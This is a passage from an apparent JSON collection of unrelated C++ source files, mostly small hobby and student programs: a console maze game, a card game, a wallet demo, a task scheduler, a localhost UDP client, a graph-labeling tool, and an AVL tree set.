\u0442\u043e\u043b\u044c\u043a\u043e \u043e\u0434\u0438\u043d, \u043d\u043e\u0440\u043c\u0430\u043b\u044c\u043d\u044b\u0439 \u043a\u043e\u0434\r\n\t\t\r\n\t\t// \u0441\u0442\u0438\u0440\u0430\u043d\u0438\u0435 \u0413\u0413 \u0432 \u0441\u0442\u0430\u0440\u043e\u0439 \u043f\u043e\u0437\u0438\u0446\u0438\u0438\r\n\t\tdeleteObject(consoleHandle, player.m_position);\r\n\r\n\t\tif(code == ESCAPE)\r\n\t\t\tbreak;\r\n\r\n\t\t// \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c \u043c\u043e\u0436\u0435\u0442 \u043d\u0430\u0436\u0430\u0442\u044c \u043b\u044e\u0431\u0443\u044e \u043a\u043d\u043e\u043f\u043a\u0443 (\u0432 \u0442\u043e\u043c \u0447\u0438\u0441\u043b\u0435 \u044d\u043d\u0442\u0435\u0440, \u044d\u0441\u043a\u0435\u0439\u043f, \u043f\u0440\u043e\u0431\u0435\u043b, \u0441\u0442\u0440\u0435\u043b\u043e\u0447\u043a\u0438), \u043f\u043e\u0441\u043b\u0435 \u0447\u0435\u0433\u043e \u0432\u0435\u0440\u043d\u0451\u0442\u0441\u044f \u043a\u043e\u0434 \u043d\u0430\u0436\u0430\u0442\u043e\u0439 \u043a\u043b\u0430\u0432\u0438\u0448\u0438\r\n\t\tswitch(code) {\r\n\t\t\tcase ENTER:\r\n\t\t\t\t// cout << \"ENTER\\n\";\r\n\t\t\t\tbreak;\r\n\t\t\tcase SPACEBAR:\r\n\t\t\t\t// cout << \"SPACEBAR\\n\";\r\n\t\t\t\tbreak;\r\n\t\t\t\r\n\t\t\tcase RIGHT:\r\n\t\t\t\tif(location[player.m_position.Y][player.m_position.X + 1] != WALL)\r\n\t\t\t\t\t++player.m_position.X;\r\n\t\t\t\tbreak;\r\n\t\t\tcase LEFT:\r\n\t\t\t\tif(player.m_position.X > 0 && location[player.m_position.Y][player.m_position.X - 1] != WALL)\r\n\t\t\t\t\t--player.m_position.X;\r\n\t\t\t\tbreak;\r\n\t\t\tcase UP:\r\n\t\t\t\t// cout << \"UP\\n\";\r\n\t\t\t\tif(location[player.m_position.Y - 1][player.m_position.X] != WALL)\r\n\t\t\t\t\t--player.m_position.Y;\r\n\t\t\t\tbreak;\r\n\t\t\tcase DOWN:\r\n\t\t\t\t// cout << \"DOWN\\n\";\r\n\t\t\t\tif(location[player.m_position.Y + 1][player.m_position.X] != WALL)\r\n\t\t\t\t\t++player.m_position.Y;\r\n\t\t\t\tbreak;\r\n\t\t\tdefault:\r\n\t\t\t\tstd::cout << code << \"\\n\";\r\n\t\t\t\t\r\n\t\t}\r\n\r\n\t\t// \u043f\u043e\u043a\u0430\u0437 \u0413\u0413 \u0432 \u043d\u043e\u0432\u043e\u0439 \u043f\u043e\u0437\u0438\u0446\u0438\u0438\r\n\t\tdrawObject(consoleHandle, player.m_position, player.m_symbol, player.m_color);\r\n\r\n\t\t// \u0432\u0437\u0430\u0438\u043c\u043e\u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0435 \u0413\u0413 \u0441 \u0434\u0440\u0443\u0433\u0438\u043c\u0438 \u043e\u0431\u044a\u0435\u043a\u0442\u0430\u043c\u0438 \u0432 \u043b\u0430\u0431\u0438\u0440\u0438\u043d\u0442\u0435\r\n\t\tif(location[player.m_position.Y][player.m_position.X] == COIN) {\r\n\t\t\t\r\n\t\t\t++player.m_coins;\r\n\t\t\t--countOfObject.m_stars;\r\n\r\n\t\t\tlocation[player.m_position.Y][player.m_position.X] = HALL;\r\n\t\t}\r\n\t\t\r\n\t\tif(location[player.m_position.Y][player.m_position.X] == ENEMY) {\r\n\t\t\t\r\n\t\t\tplayer.m_health -= 20;\r\n\r\n\t\t\t--countOfObject.m_enemy;\r\n\r\n\t\t\tlocation[player.m_position.Y][player.m_position.X] = HALL;\r\n\t\t}\r\n\t\t\r\n\t\t//\u0443\u043c\u0435\u043d\u044c\u0449\u0430\u044e \u044d\u043d\u0435\u0440\u0433\u0438\u044e \u0438\u0433\u0440\u043e\u043a\u0430 \u043a\u0430\u0436\u0434\u044b\u0439 \u0448\u0430\u0433\r\n\t\tplayer.m_energy -= 1;\r\n\r\n\t\tenemyMovement(consoleHandle, location, HEIGHT, WIDTH);\r\n\t\t\r\n\t\tif(gameOver(player, countOfObject)) {\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"catalogo_produtos\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n\nint main() {\n    std::cout << \"Hello! Let's play a game.\" << std::endl;\n    std::cout << \"You have 10 cards, you play versus the machine and at each turn, you can remove 3 or 4 cards.\" << std::endl;\n    std::cout << \"The player who has to play and there is no card left looses.\" << std::endl;\n    std::cout << std::endl;\n\n    bool is_finished = false;\n    int nb_of_cards = 10;\n    bool human_turn = true;\n    bool player_wins = true;\n\n    while (is_finished == false) {\n        if (human_turn) {\n            int player_choice;\n            std::cout << \"Your turn ! Please enter a valid (3 or 4) number of cards you want to remove knowing that there are still \" << nb_of_cards << \" cards left : \" << std::endl;\n            std::cin >> player_choice;\n            if (player_choice == 3) {\n                if (nb_of_cards >= 3) {\n                    nb_of_cards = nb_of_cards - 3;\n                    std::cout << \"There are still \" << nb_of_cards << \" cards left.\" << std::endl;\n                }\n                else {\n                    std::cout << \"Game ends !! YOU LOST\" << std::endl;\n                    is_finished = true;\n                    player_wins = false;\n                }\n            }\n            else if (player_choice == 4) {\n                if (nb_of_cards >= 4) {\n                    nb_of_cards = nb_of_cards - 4;\n                    std::cout << \"There are still \" << nb_of_cards << \" cards left.\" << std::endl;\n                    std::cout << std::endl;\n                }\n                else {\n                    std::cout << \"Game ends !! YOU LOST\" << std::endl;\n                    is_finished = true;\n                    player_wins = false;\n                }\n            }\n            else {\n                std::cout << \"You have to enter a valid number !\";\n                is_finished = true;\n            }\n            human_turn = false;\n        }\n        else {\n            std::cout << \"Machine is playing... \" << std::endl;\n            human_turn = true;\n            if (nb_of_cards == 7) {\n                nb_of_cards = nb_of_cards - 3;\n                std::cout << \"There are still \" << nb_of_cards << \" cards left.\" << std::endl;\n                std::cout << std::endl;\n            }\n            else if (nb_of_cards == 6) {\n                nb_of_cards = nb_of_cards - 4;\n                std::cout << \"There are still \" << nb_of_cards << \" cards left.\" << std::endl;\n                std::cout << std::endl;\n            }\n            else if (nb_of_cards == 4) {\n                nb_of_cards = nb_of_cards - 3;\n                std::cout << \"There are still \" << nb_of_cards << \" cards left.\" << std::endl;\n                std::cout << std::endl;\n            }\n            else if (nb_of_cards == 3) {\n                nb_of_cards = nb_of_cards - 3;\n                std::cout << \"There are still \" << nb_of_cards << \" cards left.\" << std::endl;\n                std::cout << std::endl;\n            }\n            else {\n                std::cout << \"Machine lost\" << std::endl;\n                is_finished = true;\n            }\n        }\n    }\n    if (player_wins == true) {\n        std::cout << \"HUMAN PLAYER WINS !\" << std::endl;\n    }\n    else {\n        std::cout << \"MACHINE PLAYER WINS !\" << std::endl;\n    }\n}",
    "//\n// Created by mihir on 9/16/2024.\n//\n\n#include <iostream>\n#include \"Wallet.h\"\n\nint main() {\n    Wallet flipkartWallet;\n\n    flipkartWallet.fetchBalance(\"Bob\");\n    flipkartWallet.registerUser(\"Bob\");\n    flipkartWallet.topUpWallet(\"Bob\", \"CC\", 1000);\n    flipkartWallet.topUpWallet(\"Bob\", \"UPI\", 100);\n    flipkartWallet.fetchBalance(\"Bob\");\n\n    flipkartWallet.registerUser(\"Alice\");\n    flipkartWallet.topUpWallet(\"Alice\", \"CC\", 100);\n    flipkartWallet.fetchBalance(\"Alice\");\n\n    flipkartWallet.sendMoney(\"Bob\", \"Alice\", 1250);\n    flipkartWallet.sendMoney(\"Bob\", \"Alice\", 250);\n    flipkartWallet.sendMoney(\"Alice\", \"Bob\", 50);\n\n    flipkartWallet.fetchBalance(\"Bob\");\n    flipkartWallet.fetchBalance(\"Alice\");\n\n    for (const auto &t : flipkartWallet.getTransactions(\"Bob\", \"send\", \"amount\")) {\n        std::cout << t.getSender() << \"-> \" << t.getReceiver() << \" : \" << t.getAmount() << \" Rs\" << std::endl;\n    }\n\n    for (const auto &t : flipkartWallet.getTransactions(\"Bob\", \"receive\", \"time\")) {\n        std::cout << t.getSender() << \"-> \" << t.getReceiver() << \" : \" << t.getAmount() << \" Rs\" << std::endl;\n    }\n\n    // BONUS\n    flipkartWallet.sendMoney(\"Bob\", \"Alice\", 100);\n    std::cout << \"Bob got total cashback of \" << flipkartWallet.getCashbackAmount(\"Bob\") << \" Rs\" << std::endl;\n\n    flipkartWallet.fetchBalance(\"Bob\");\n    flipkartWallet.fetchBalance(\"Alice\");\n\n    for (const auto &t : flipkartWallet.getTransactions(\"Bob\", \"send\", \"amount\")) {\n        std::cout << t.getSender() << \"-> \" << t.getReceiver() << \" : \" << t.getAmount() << \" Rs\" << std::endl;\n    }\n\n    for (const auto &t : flipkartWallet.getTransactions(\"Bob\", \"receive\", \"time\")) {\n        std::cout << t.getSender() << \"-> \" << t.getReceiver() << \" : \" << t.getAmount() << \" Rs\" << std::endl;\n    }\n\n    return 0;\n}\n",
    "#include \"TaskMe.h\"\n\nTaskMe::TaskMe(uint8_t capacity) : _capacity(capacity), _count(0)\n{\n    _tasks = new TaskRef[_capacity];\n    for (uint8_t index = 0; index < _capacity; index++)\n    {\n        _tasks[index] = nullptr;\n    }\n}\n\nuint8_t TaskMe::Capacity() const\n{\n    return _capacity;\n}\n\nuint8_t TaskMe::Count() const\n{\n    return _count;\n}\n\nuint8_t TaskMe::AddDelay(int time, Action callback)\n{\n    return addTask(time, nullptr, nullptr, 1, callback);\n}\n\nuint8_t TaskMe::AddSingle(int time, Action action)\n{\n    return addTask(time, action, nullptr, 1, nullptr);\n}\n\nuint8_t TaskMe::AddSingle(int time, Action action, Action callback)\n{\n    return addTask(time, action, nullptr, 1, callback);\n}\n\nuint8_t TaskMe::AddRepetitive(int time, Action action, unsigned int repetitions)\n{\n    return addTask(time, action, nullptr, repetitions, nullptr);\n}\n\nuint8_t TaskMe::AddRepetitive(int time, Action action, unsigned int repetitions, Action callback)\n{\n    return addTask(time, action, nullptr, repetitions, callback);\n}\n\nuint8_t TaskMe::AddContinuous(int time, Action action)\n{\n    return addTask(time, action, nullptr, 0, nullptr);\n}\n\nuint8_t TaskMe::AddContinuous(int time, Action action, Action callback)\n{\n    return addTask(time, action, nullptr, 0, callback);\n}\n\nuint8_t TaskMe::AddAlternant(int time, Action action, Action alternateAction, unsigned int repetitions)\n{\n    return addTask(time, action, alternateAction, repetitions, nullptr);\n}\n\nuint8_t TaskMe::AddAlternant(int time, Action action, Action alternateAction, unsigned int repetitions, Action callback)\n{\n    return addTask(time, action, alternateAction, repetitions, callback);\n}\n\nuint8_t TaskMe::AddAlternantContinuous(int time, Action action, Action alternateAction)\n{\n    return addTask(time, action, alternateAction, 0, nullptr);\n}\n\nuint8_t TaskMe::AddAlternantContinuous(int time, Action action, Action alternateAction, Action callback)\n{\n    return addTask(time, action, alternateAction, 0, callback);\n}\n\nvoid TaskMe::Update()\n{\n    for (uint8_t index = 0; index < _capacity; index++)\n    {\n        if (_tasks[index] != nullptr)\n        {\n            bool finished = updateTask(_tasks[index]);\n\n            if (finished)\n            {\n                if (_tasks[index]->callback != nullptr) \n                    _tasks[index]->callback();\n                \n                removeTask(index);\n            }\n        }\n    }\n}\n\nvoid TaskMe::CancelTask(uint8_t index)\n{\n    removeTask(index);\n}\n\nbool TaskMe::IsFull() const\n{\n    return _count >= _capacity;\n}\n\nbool TaskMe::IsEmpty() const\n{\n    return _count == 0;\n}\n\nuint8_t TaskMe::addTask(int time, Action action, Action alternateAction, unsigned int repetitions, Action callback)\n{\n    if (IsFull()) return _count;\n\n    for (uint8_t index = 0; index < _capacity; index++)\n    {\n        if (_tasks[index] == nullptr)\n        {\n            _tasks[index] = new Task();\n            _tasks[index]->time = time;\n            _tasks[index]->trigger = millis() + time;\n            _tasks[index]->action = action;\n            _tasks[index]->alternateAction = alternateAction;\n            _tasks[index]->repetitions = repetitions;\n            _tasks[index]->callback = callback;\n            _count++;\n            return index;\n        }\n    }\n    return _count;\n}\n\nvoid TaskMe::rearmTask(TaskRef task, Action action, Action alternateAction, unsigned int repetitions)\n{\n    task->trigger = millis() + task->time;\n    task->action = action;\n    task->alternateAction = alternateAction;\n    task->repetitions = repetitions;\n}\n\nvoid TaskMe::removeTask(uint8_t index)\n{\n    if (index >= _capacity) return;\n\n    delete _tasks[index];\n    _tasks[index] = nullptr;\n    _count--;\n}\n\nbool TaskMe::updateTask(TaskRef task) const\n{\n    unsigned long currentMillis = millis();\n    if (currentMillis >= task->trigger)\n    {\n        return processTask(task);\n    }\n    return false;\n}\n\nbool TaskMe::processTask(TaskRef task) const\n{\n    if (task->action != nullptr) task->action();\n\n    if (task->repetitions == 1) return true;\n\n    if (task->repetitions > 1)\n    {\n        rearmTask(task, task->alternateAction == nullptr ? task->action : task->alternateAction, task->alternateAction == nullptr ? nullptr : task->action, task->repetitions - 1);\n    }\n    else if (task->repetitions == 0)\n    {\n        rearmTask(task, task->alternateAction == nullptr ? task->action : task->alternateAction, task->alternateAction == nullptr ? nullptr : task->action, 0);\n    }\n\n    return false;\n}",
    "#include <iostream>\n#include <cstring>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>  // Include this header for inet_addr\n#include <unistd.h>\n\n#define PORT 8080\n#define BUFFER_SIZE 1024\n\nint main() {\n    int sockfd;\n    char buffer[BUFFER_SIZE];\n    struct sockaddr_in serveraddr;\n    socklen_t len = sizeof(serveraddr);\n\n    // Create socket\n    sockfd = socket(AF_INET, SOCK_DGRAM, 0);\n    if (sockfd < 0) {\n        perror(\"Socket creation failed\");\n        return 1;\n    }\n\n    // Prepare server address\n    memset(&serveraddr, 0, sizeof(serveraddr));\n    serveraddr.sin_family = AF_INET;\n    serveraddr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\n    serveraddr.sin_port = htons(PORT);\n\n    while (true) {\n        // Get user input\n        std::cout << \"Enter message to send: \";\n        std::cin.getline(buffer, BUFFER_SIZE);\n\n        // Send message to server\n        sendto(sockfd, buffer, strlen(buffer), 0, (struct sockaddr*)&serveraddr, len);\n\n        // Receive acknowledgment from server\n        ssize_t n = recvfrom(sockfd, buffer, BUFFER_SIZE, 0, (struct sockaddr*)&serveraddr, &len);\n        if (n < 0) {\n            perror(\"Receive failed\");\n            continue;\n        }\n        buffer[n] = '\\0';\n\n        std::cout << \"Server response: \" << buffer << std::endl;\n    }\n\n    close(sockfd);\n    return 0;\n}\n",
    "#include <iostream>\r\n#include <cctype>  // for std::tolower and std::isalnum\r\n#include <string>  // for std::string\r\n\r\nbool isPalindrome(const std::string& str) {\r\n    int left = 0;\r\n    int right = str.size() - 1;\r\n\r\n    while (left < right) {\r\n        // Move left index to the next alphanumeric character\r\n        while (left < right && !std::isalnum(str[left])) {\r\n            ++left;\r\n        }\r\n        // Move right index to the previous alphanumeric character\r\n        while (left < right && !std::isalnum(str[right])) {\r\n            --right;\r\n        }\r\n\r\n        // Compare characters in a case-insensitive manner\r\n        if (std::tolower(str[left]) != std::tolower(str[right])) {\r\n            return false;\r\n        }\r\n\r\n        ++left;\r\n        --right;\r\n    }\r\n\r\n    return true;\r\n}\r\n\r\nint main() {\r\n    std::string input;\r\n    std::cout << \"Place the string: \";\r\n    std::getline(std::cin, input);\r\n\r\n    if (isPalindrome(input)) {\r\n        std::cout << \"\\\"\" << input << \"\\\" is a palindrome.\" << std::endl;\r\n    } else {\r\n        std::cout << \"\\\"\" << input << \"\\\" is not a palindrome.\" << std::endl;\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "// umac_ssp_exp.cpp : Defines the entry point for the console application.\n//\n\n//#include \"command/ConstructionParadigms.h\"\n//#include \"command/IndexProcessing.h\"\n//#include \"command/QueryProcessing.h\"\n\n#include <iostream>\n#include <fstream>\n#include <map>\n#include \"command/IndexProcessing.h\"\n#include \"command/ConstructionParadigms.h\"\n#include \"command/QueryProcessing.h\"\n\nusing namespace std;\n\nvoid exit_with_help(){\n    printf(\"Command Usage: (the first parameter specifies the procedure be executed)\\n\");\n    printf(\"-------------------------------------------------------------------\\n\");\n    printf(\"(1) -x: Indexing by different ordering schemes:\\n\");\n    printf(\"\\tsspexp_run -x -d [directedGraphFlag] -w [weightedGraphFlag] -s [specialFlag] -m [orderingSchemes] [-a [s_beta]] -g [graphFileName] -e [exportLabelFileName] \\n\");\n    printf(\"-------------------------------------------------------------------\\n\");\n    printf(\"(2) -q: Query testing for a label file:\\n\");\n    printf(\"\\tsspexp_run -q -d [directedGraphFlag] -s [specialFlag] [-o [orderFileName]] -l [inputLabelFileName] -n [queryNum] \\n\");\n    printf(\"-------------------------------------------------------------------\\n\");\n    printf(\"(3) -y: Indexing by different construction paradigms (given ordering file):\\n\");\n    printf(\"\\tsspexp_run -y -d [directedGraphFlag] -w [weightedGraphFlag] -m [consturctionParadigms] -g [graphFileName] -o [orderFileName] -e [exportLabelFileName] \\n\");\n    printf(\"-------------------------------------------------------------------\\n\");\n    printf(\"Parameter explanation:\\n\");\n    printf(\"\\t[directedGraphFlag]: 0 or 1, for undirected and directed graphs, default is 0\\n\");\n    printf(\"\\t[weightedGraphFlag] = 0 or 1, for unweighted and weighted graphs, default is 0\\n\");\n    printf(\"\\t[specialFlag] = 0: default label\\n \\t\\t\\t1: path label\\n \\t\\t\\t2: bp label\\n \\t\\t\\t3: HLC label\\n \\t\\t\\t4: HLCM label\\n\");\n    printf(\"\\t[orderingSchemes] = 0: DHP \\n \\t\\t\\t1: BHP\\n \\t\\t\\t2: SHP\\n\");\n    printf(\"\\t[s_beta]: [Optional]trade-off parameter for BHP, default is 1\\n\");\n    printf(\"\\t[queryNum]: the number of randomly generated non-duplicated reachable queries. Extra half of queryNum will be generated for warm-up\\n\");\n    printf(\"\\t[orderFileName]: only required for path query processing\\n\");\n    printf(\"\\t[consturctionParadigms] = 0: Hub Pushing Algorithm \\n \\t\\t\\t\\t1: Hub Pulling Algorithm\\n\");\n\n    \n    printf(\"-------------------------------------------------------------------\\n\");\n    printf(\"Examples:\\n\");\n    printf(\"Indexing SHP with BP optimization for directed unweighted graph a.txt, outputing alabel.label and alabel.order\\n\");\n    printf(\"\\tsspexp_run -x -d 1 -w 0 -s 2 -m 2 -g a.txt -e alabel \\n\");\n    printf(\"Indexing Hub Pushing Algorithm given odering file alabel.order for directed unweighted graph a.txt, outputing alabel.label\\n\");\n    printf(\"\\tsspexp_run -y -d 1 -w 0 -m 0 -g a.txt -o alabel.order -e alabel \\n\");\n    printf(\"Query processing for 1000000 random queries for directed path label alabel_path.label\\n\");\n    printf(\"\\tsspexp_run -q -d 1 -s 1 -l alabel_path.label -n 1000000 \\n\");\n    printf(\"Query processing for 1000000 random queries for directed HLC label alabel_hlc.label with alabel_hlc.order\\n\");\n    printf(\"\\tsspexp_run -q -d 1 -s 1 -o alabel_hlc.order -l alabel_hlc.label -n 1000000 \\n\");\n    printf(\"-------------------------------------------------------------------\\n\");\n    exit(1);\n}\n\nvoid save_to_edge_index(int argc,char *argv[] ){\n\n    string outFileName;\n\n    for(int i = 2; i < argc; i++){\n        if(argv[i][0] != '-') break;\n        if(++i >= argc)\n            exit_with_help();\n        switch (argv[i-1][1]){\n            case 'e':\n                outFileName = string(argv[i]);\n                break;\n        }\n    }\n    \n    ifstream label(outFileName+\".label\");\n    ifstream order(outFileName+\".order\");\n    ofstream edge_index(outFileName+\".hub_edge_index\");\n    ofstream weight(outFileName+\".w\");\n\n    map<int, int> o;\n    int i = 0;\n    int s;\n    while(order >> s){\n        o[i++] = s;\n    }\n\n    string line;\n    int n;\n    int t,d;\n\n    i = 0;\n    while (getline(label, line)){\n        const char* p = line.c_str();\n        while(sscanf(p,\"%d,%d%n\",&t,&d,&n)==2){\n            p += n;\n            if (i == o[t]) continue;\n            edge_index << i <<' '<< o[t]<<endl;\n            weight << d <<endl;;\n        }\n        i++;\n\n    }\n\n    label.close();\n    order.close();\n    remove((outFileName+\".label\").c_str());\n    remove((outFileName+\".order\").c_str());\n    \n\n}\n\n\n\n    /** The main program. */\n                            \nint main(int argc, char *argv[]){\n    // The program is controlled by command-line arguments. The order of those\n    // arguments is important. The first argument specifies the Command-\n    // class that is used.\n    \n    int opt = 'm';\n    if (argc > 1){\n        switch (argv[1][1]){\n            case 'x':\n                opt = 'x';\n                break;\n            case 'q':\n              ",
    "#include \"stack.cpp\"\n#include \"matrix.cpp\"\n#include \"menu.cpp\"\nint main()\n{\n   Matrix matrix1,matrix2,matrix3;\n   Stack s1;\n   int num1,num2;\n   int alegere1{1};\n   int alegere2,num;\n\n\n\n  while (alegere1 != 0)\n  {\n   mainMenu();\n   std::cin >> alegere1;\n   switch (alegere1)\n   {\n   case 1:\n      alegere2 = 1;\n      while (alegere2 != 0)\n      {\n         stackMenu();\n         std::cin >> alegere2;\n         switch (alegere2)\n         {\n         case 1:\n            s1 = Stack();\n            break;\n         case 2:\n            std::cout << \"Da marimea stackului \\n\";\n            std::cin >> num;\n            s1 = Stack(num);\n            break;\n         case 3:\n            std::cout << \"Da numarul \\n\";\n            std::cin >> num;\n            s1.Push(num);\n         break;\n         case 4:\n         s1.Pop();\n         break;\n\n         case 5:\n           if (s1.IsEmpty() == true)\n           {\n             std::cout << \"Stackul e gol \\n\";\n           }\n           else\n           {\n            std::cout << \"Stackul nu e gol \\n\";\n           }\n           \n           \n         break;\n\n         case 6:\n           if (s1.IsFull() == true)\n           {\n            std::cout << \"Stackul e plin \\n\";\n           }\n           else\n           {\n            std::cout << \"Stackul nu e plin \\n\";\n           }\n           \n           \n         break;\n\n         case 7:\n          s1.printElem();\n         break;\n         default:\n            break;\n         }\n      }\n      break;\n      \n      case 2:\n      alegere2 = 1;\n      while (alegere2 != 0)\n      {\n         matrixMenu();\n         std::cin >> alegere2;\n\n         switch (alegere2)\n         {\n         case 1:\n           std::cout << \"Da marimea matricei \\n\";\n           std::cin >> num1;\n           matrix1 = Matrix(num1);\n            break;\n         case 2:\n            std::cout << \"Da marimea matricei(2 parametri)\\n\";\n           std::cin >> num1 >> num2;\n           matrix1 = Matrix(num1,num2); \n         break;\n\n         case 3:\n            std::cout << \"Da marimea noua a matrici(i si j)\\n\";\n            std::cin >> num1 >> num2;\n             matrix1.setM(num1,num2);\n         break;\n\n         case 4:\n           std::cout << \"Apasa 1 pentru matricea 1 si 2 pentru matricea 2 \\n\";\n           std::cin >> num1;\n           if (num1 == 1)\n           {\n            matrix1.fillMatrix();\n           }\n           else\n           {\n            matrix2.fillMatrix();\n           }\n           \n         break;\n\n         case 5:\n           matrix2.subtractM(matrix1);\n         break;\n\n         case 6:\n           matrix1.addM(matrix2);\n         break;\n\n         case 7:\n         matrix3 = Matrix(matrix1.multiplyM(matrix2));\n         break;\n\n         case 8:\n           matrix1.printMatrix();\n           matrix2.printMatrix();\n           matrix3.printMatrix();\n         break;\n         default:\n            break;\n         }\n      }\n      \n      break;\n   default:\n      break;\n   }\n  }\n  \n    \n}",
    "/*@ <authors>\n*\n * Jonathan Paul Moyonero Espinoza\n * Unai Piris Ib\u00e1\u00f1ez\n *\n *@ </authors> */\n\n//\n//  TreeSet_AVL.h\n//\n//  Implementaci\u00f3n de conjuntos mediante \u00e1rboles de b\u00fasqueda AVL\n//\n//  Facultad de Inform\u00e1tica\n//  Universidad Complutense de Madrid\n//\n//  Copyright (c) 2020 Alberto Verdejo\n//\n\n#ifndef TREESET_AVL_H_\n#define TREESET_AVL_H_\n\n#include <algorithm>\n#include <functional>\n#include <stack>\n#include <stdexcept>\n#include <utility>\n#include <iostream>\n#include <fstream>\n\nusing namespace std;\n\ntemplate<class T, class Comparator = std::less<T> >\nclass Set {\nprotected:\n    /*\n     Nodo que almacena internamente el elemento (de tipo T),\n     punteros al hijo izquierdo y derecho, que pueden ser\n     nullptr si el hijo es vac\u00edo, y la altura.\n     */\n    struct TreeNode;\n    using Link = TreeNode *;\n\n    struct TreeNode {\n        T elem;\n        Link iz, dr;\n        int altura;\n        int tam_i;\n\n        TreeNode(T const &e, Link i = nullptr, Link d = nullptr,\n                 int alt = 1, int tam_i = 1) : elem(e), iz(i), dr(d), altura(alt), tam_i(tam_i) {\n        }\n    };\n\n    // puntero a la ra\u00edz de la estructura jer\u00e1rquica de nodos\n    Link raiz;\n\n    // n\u00famero de elementos (cardinal del conjunto)\n    int nelems;\n\n    // objeto funci\u00f3n que compara elementos (orden total estricto)\n    Comparator menor;\n\n    int tam_i;\n\npublic:\n    // constructor (conjunto vac\u00edo)\n    Set(Comparator c = Comparator()) : raiz(nullptr), nelems(0), menor(c) {\n    }\n\n    // constructor por copia\n    Set(Set const &other) {\n        copia(other);\n    }\n\n    // operador de asignaci\u00f3n\n    Set &operator=(Set const &that) {\n        if (this != &that) {\n            libera(raiz);\n            copia(that);\n        }\n        return *this;\n    }\n\n    ~Set() {\n        libera(raiz);\n    };\n\n    bool insert(T const &e) {\n        return inserta(e, raiz);\n    }\n\n    bool empty() const {\n        return raiz == nullptr;\n    }\n\n    int size() const {\n        return nelems;\n    }\n\n    bool contains(T const &e) const {\n        return pertenece(e, raiz);\n    }\n\n    bool erase(T const &e) {\n        return borra(e, raiz);\n    }\n\n    T const &kesimo(int k) const {\n        return kesimo(k, raiz);\n    }\n\n    T const &kesimo(int k, Link tree) const {\n        if (tree == nullptr) {\n            return -1;\n        }\n\n        if (k == tree->tam_i) {\n            return tree->elem;\n        }\n\n        if (k < tree->tam_i) {\n            return kesimo(k, tree->iz);\n        }\n\n        return kesimo(k - tree->tam_i, tree->dr);\n    }\n\nprotected:\n    void copia(Set const &other) {\n        raiz = copia(other.raiz);\n        nelems = other.nelems;\n        menor = other.menor;\n    }\n\n    static Link copia(Link a) {\n        if (a == nullptr) return nullptr;\n        else return new TreeNode(a->elem, copia(a->iz), copia(a->dr), a->altura);\n    }\n\n    static void libera(Link a) {\n        if (a != nullptr) {\n            libera(a->iz);\n            libera(a->dr);\n            delete a;\n        }\n    }\n\n    bool pertenece(T const &e, Link a) const {\n        if (a == nullptr) {\n            return false;\n        } else if (menor(e, a->elem)) {\n            return pertenece(e, a->iz);\n        } else if (menor(a->elem, e)) {\n            return pertenece(e, a->dr);\n        } else {\n            // e == a->elem\n            return true;\n        }\n    }\n\n    bool inserta(T const &e, Link &a) {\n        bool crece;\n        if (a == nullptr) {\n            // se inserta el nuevo elemento e\n            a = new TreeNode(e);\n            ++nelems;\n            crece = true;\n        } else if (menor(e, a->elem)) {\n            crece = inserta(e, a->iz);\n\n            if (crece) {\n                a->tam_i += 1;\n                reequilibraDer(a);\n            }\n        } else if (menor(a->elem, e)) {\n            crece = inserta(e, a->dr);\n            if (crece) reequilibraIzq(a);\n        } else // el elemento e ya est\u00e1 en el \u00e1rbol\n            crece = false;\n        return crece;\n    }\n\n    int altura(Link a) {\n        if (a == nullptr) return 0;\n        else return a->altura;\n    }\n\n    void rotaDer(Link &r2) {\n        int tam1 = r2->tam_i;\n        int tam2 = r2->iz->tam_i;\n\n        Link r1 = r2->iz;\n        r2->iz = r1->dr;\n        r1->dr = r2;\n        r2->altura = std::max(altura(r2->iz), altura(r2->dr)) + 1;\n        r1->altura = std::max(altura(r1->iz), altura(r1->dr)) + 1;\n        r2 = r1;\n        r2->dr->tam_i = tam1 - tam2;\n    }\n\n    void rotaIzq(Link &r1) {\n        Link r2 = r1->dr;\n        r1->dr = r2->iz;\n        r2->iz = r1;\n        r1->altura = std::max(altura(r1->iz), altura(r1->dr)) + 1;\n        r2->altura = std::max(altura(r2->iz), altura(r2->dr)) + 1;\n        r1 = r2;\n        r1->tam_i = r1->iz->tam_i + r1->tam_i;\n    }\n\n    void rotaIzqDer(Link &r3) {\n        rotaIzq(r3->iz);\n        rotaDer(r3);\n    }\n\n    void rotaDerIzq(Link &r1) {\n        rotaDer(r1->dr);\n        rotaIzq(r1);\n    }\n\n    void reequilibraIzq(Link &a) {\n        if (altura(a->dr) - altura(a->iz) > 1) {\n            if (al",
